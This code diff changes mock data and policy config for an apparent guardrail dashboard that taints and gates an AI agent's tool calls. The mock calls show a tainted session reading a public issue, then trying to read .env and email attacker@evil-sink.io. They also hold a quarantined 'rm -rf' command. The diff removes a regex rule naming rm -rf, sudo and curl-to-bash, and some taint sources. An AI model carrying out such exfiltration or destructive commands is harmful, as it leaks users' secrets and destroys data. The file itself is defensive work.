@@ -2,6 +2,8 @@ import { ToolCall, QuarantineItem, BenchmarkMetric, PipelineStatus } from './typ
 
 export const initialPipelineStatus: PipelineStatus = {
   agentStatus: 'active',
+  provider: 'ollama',
+  model: 'qwen3:8b',
   jwtVerified: true,
   taintState: 'TAINTED',
   policyGateVerdict: 'DENY',
@@ -20,6 +22,7 @@ export const mockToolCalls: ToolCall[] = [
     id: 'tc-001',
     timestamp: '20:48:12.104',
     session: 'sess_9f8a12',
+    provider: 'ollama',
     tool: 'read_file',
     args: { path: 'sandbox/README.md' },
     taint: 'CLEAN',
@@ -32,8 +35,9 @@ export const mockToolCalls: ToolCall[] = [
     id: 'tc-002',
     timestamp: '20:48:14.331',
     session: 'sess_9f8a12',
-    tool: 'read_file',
-    args: { path: 'sandbox/public_issue.txt' },
+    provider: 'groq',
+    tool: 'read_public_issue',
+    args: { issue_id: 'public_issue.txt' },
     taint: 'CLEAN',
     verdict: 'ALLOW',
     latencyMs: 1.45,
@@ -48,6 +52,7 @@ export const mockToolCalls: ToolCall[] = [
     id: 'tc-003',
     timestamp: '20:48:15.019',
     session: 'sess_9f8a12',
+    provider: 'ollama',
     tool: 'read_file',
     args: { path: 'sandbox/.env' },
     taint: 'TAINTED',
@@ -60,6 +65,7 @@ export const mockToolCalls: ToolCall[] = [
     id: 'tc-004',
     timestamp: '20:48:16.892',
     session: 'sess_9f8a12',
+    provider: 'groq',
     tool: 'send_external_email',
     args: {
       to: 'attacker@evil-sink.io',
@@ -79,6 +85,7 @@ export const mockToolCalls: ToolCall[] = [
     id: 'tc-005',
     timestamp: '20:48:22.450',
     session: 'sess_4b2c89',
+    provider: 'ollama',
     tool: 'bash_exec',
     args: { command: 'rm -rf /tmp/cache_build && tar -czf backup.tar.gz ./dist' },
     taint: 'CLEAN',
@@ -86,18 +93,6 @@ export const mockToolCalls: ToolCall[] = [
     latencyMs: 2.10,
     reason: 'Shell execution matched high-risk quarantine pattern',
     responsePayload: { status: 'PENDING_OPERATOR_APPROVAL', quarantineId: 'q-101' },
-  },
-  {
-    id: 'tc-006',
-    timestamp: '20:48:25.801',
-    session: 'sess_7c3e14',
-    tool: 'sql_query',
-    args: { query: 'SELECT id, username, email FROM users LIMIT 10' },
-    taint: 'CLEAN',
-    verdict: 'ALLOW',
-    latencyMs: 1.34,
-    reason: 'Read-only SQL schema query approved',
-    responsePayload: { rowCount: 10, executionMs: 4.2 },
   },
 ];
 
@@ -115,21 +110,6 @@ export const mockQuarantineQueue: QuarantineItem[] = [
     taint: 'CLEAN',
     riskSummary: 'Shell command contains destructive file removal (rm -rf)',
     ruleMatched: 'QUARANTINE_SHELL_DESTRUCTIVE_PATTERN',
-    status: 'PENDING',
-  },
-  {
-    id: 'q-102',
-    session: 'sess_993f12',
-    timestamp: '20:49:01.112',
-    tool: 'github_create_issue',
-    args: {
-      repo: 'acme/core-infra',
-      title: 'Automated sync: production telemetry',
-      body: 'Contains aggregate metrics and trace dumps from cluster 04.',
-    },
-    taint: 'TAINTED',
-    riskSummary: 'External repository publication invoked under TAINTED session',
-    ruleMatched: 'QUARANTINE_TAINTED_PUBLIC_WRITES',
     status: 'PENDING',
   },
 ];
@@ -203,12 +183,10 @@ path_protection:
 
 taint_engine:
   sources:
+    - tool: "read_public_issue"
+      mark: "TAINTED"
     - tool: "read_file"
       path_match: "^sandbox/public_.*$"
-      mark: "TAINTED"
-    - tool: "fetch_url"
-      mark: "TAINTED"
-    - tool: "fetch_inbox_email"
       mark: "TAINTED"
   sinks:
     egress_tools:
@@ -230,13 +208,6 @@ policy_rules:
       path_any: ["^.*\\.env.*$", "^.*credentials.*$"]
     verdict: "DENY"
     reason: "Secret access hard blocked by policy"
-
-  - id: "RULE_QUARANTINE_SHELL"
-    match:
-      tool: "bash_exec"
-      command_regex: "rm\\s+-rf|sudo|chmod\\s+777|curl.*\\|.*bash"
-    verdict: "QUARANTINE"
-    reason: "Destructive shell command requires operator approval"
 
   - id: "RULE_TAINTED_EGRESS_VETO"
     condition: "session.taint == 'TAINTED'"
